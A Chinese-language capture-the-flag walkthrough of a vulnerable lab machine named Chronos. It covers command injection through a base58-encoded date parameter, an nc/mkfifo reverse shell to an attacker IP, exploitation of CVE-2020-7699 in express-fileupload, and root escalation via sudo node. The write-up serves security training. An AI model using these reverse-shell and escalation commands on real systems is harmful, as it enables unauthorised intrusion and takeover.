**0****2**** 端口发现**  

  

扫描靶机信息，发现开放了22、25、80、110、8000端口

![](../Images/56c96f261c33c712906fe60ab8ef5915.png)

  

**0****3**** WEB访问**  

  

访问web80和8000端口，都没有什么可利用的

![](../Images/14e7005adbf5cd0116b8c4bbfa8fce66.png)

  

![](../Images/84e308d65776c39e7ab1cd85d1019cd5.png)

查看源码，发现可疑的url，

```
http://chronos.
```

  

![](../Images/7e018d5cf6602e2bb2bf0eb9b8b620fd.png)

  

将chronos.local添加到/etc/hosts下正常解析

![](../Images/dc3fd073802d7c1d0b76d3c2d957cf89.png)

再次访问80网站，4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL这一串应该是日期命令

![](../Images/5e4ec47977e79dbebe8debaf012d51aa.png)

  

http://chronos.local:8000/date?format=ls，将format后边随便加个ls，报错，非base58字符

![](../Images/cb7db30c18482a016cc546c61faad713.png)

那就用base解密一下4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL，日期命令

![](../Images/8569af3080f0b7c718138dd56a501af7.png)

在web80端口利用burpsuite抓包，这里有2个包，一个是OPTIONS的包是80端口的先放过去，然后会有一个GET的向chronos.local:8000发送的请求包，发现User-Agent: Chronos和OPIIONS包的不同，执行pwd命令，用base58加密得到5JeBr9q，运行后成功返回当前目录为/opt/chronos。

![](../Images/879f8f7d1764a5dff9909bdf72cc3889.png)

查看下/etc/passwd，成功执行，只有一个imera用户

![](../Images/c2e575625760b97a304fcfd35106cfd7.png)

  

  

**0****4**** 反弹shell**  

  

利用nc 反弹shell，rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.1.169 1234 >/tmp/f经过base58加密得到2gxfnU3zJpKCbHYT5fzvYdqM2TL9waXViedX88Z8vgmKyvFDw7fCgTnFfh8qwVeVw6NkvRhjRzq3iDgmko7c7TeM5AksHZV6oe5，直接添加在format=之后运行就可以。

![](../Images/897d486cf2b911c8e089cdf0ced82318.png)

![](../Images/0e2252d2236596e88188d3e347a4fa8c.png)

本机开启监听，执行后反弹成功。

![](../Images/bedf00a2baa4389f72f605b97084a709.png)

python -c 'import pty;pty.spawn("/bin/bash")'升级下shell，在/opt目录又发现个chronos-v2目录，backend目录，依次查看

![](../Images/1fcd6323bd16d362a0360e900df39f2a.png)

  

**0****5****express-fileupload**** RCE漏洞利用**  

  

express-fileupload文件上传，在本地监听了8080端口

![](../Images/fc1297e283a76b4e5cea1c41794c6b88.png)

查找express-fileupload漏洞，CVE-2020-7699，ejs模板引擎存在一个利用原型污染，进行RCE

![](../Images/acfb03224c9920bf800b9648b8c13c2d.png)

在https://blog.p6.is/Real-World-JS-1/得到利用代码

![](../Images/c831d5109e387a859a1a77b50cc5baed.png)

已经得到靶机监听的是本地8080端口，更改一下代码，写入到shell.py

![](../Images/ae3ed0ee2e7917a34ab7bf6702702a28.png)

本地开启python -m http.server 80，靶机下载shell.py到/tmp下

![](../Images/32d6fc6ca66c745816611376feef7397.png)

本地开启监听，靶机给shell.py赋权，执行，成功反弹连接

![](../Images/4efc5b39d0311ef08724ef504c0e5148.png)

![](../Images/beb058f04ce500c392121975a965b251.png)

  

**0****6**** 提权**  

  

进到/home/imera下，查看user.txt，得到flag：byBjaHJvbm.9zIHBlcm5hZWkgZmlsZSBtb3UK。  

![](../Images/65eef673eb4dfd6ff24ea56c39f41132.png)

习惯性sudo -l，发现可以不需要密码执行/usr/local/bin/npm \*和/usr/local/bin/node \*

![](../Images/37f4ff631eb183163d99091fc7ec1f2e.png)

python -c 'import pty;pty.spawn("/bin/bash")'先升级下shell，尝试了npm无法提权，那就用node提权

![](../Images/22ef7b7cb4144f26653e65c7651135d1.png)

直接执行sudo node -e 'child\_process.spawn("/bin/sh", {stdio: \[0, 1, 2\]})'，得到root权限，拿到flag：YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK。

![](../Images/b842ad72fe522b2644aa2693be88ab0b.png)
